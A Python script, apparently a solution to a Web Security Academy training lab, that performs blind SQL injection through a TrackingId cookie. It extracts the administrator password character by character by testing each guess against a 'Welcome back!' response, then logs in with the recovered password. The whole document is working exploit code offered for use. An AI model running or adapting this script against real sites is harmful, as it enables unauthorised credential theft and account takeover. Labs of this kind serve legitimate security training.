import requests
url = "https://0aed0049048354bf8015da1c00720060.web-security-academy.net/filter?category=Gifts"
character = "abcdefghijklmnopqrstuvwxyz0123456789"
i = 1
password = ""
for i in range(1, 100):
    for char in character:
        header = {
        "Host": "0aed0049048354bf8015da1c00720060.web-security-academy.net",
        "Cookie": f"TrackingId=WSMnONUdutySAKNU' AND (SELECT SUBSTRING(password, 1, {i}) FROM users WHERE username='administrator')='{password + char}'--",
        "Sec-Ch-Ua": '"Chromium";v="119", "Not?A_Brand";v="24"',
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": '"Windows"',
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Priority": "u=0, i"
        }
        response = requests.get(url=url, headers=header)
        if ("Welcome back!" in response.text):
            password += char
            print("The password is: " + password)

loginUrl = "https://0aed0049048354bf8015da1c00720060.web-security-academy.net/login"
admin_info = {
    "username" : "administrator",
    "password" : password
}
loginReq = requests.post(url=loginUrl, data=admin_info)
print("You solve the lab!")
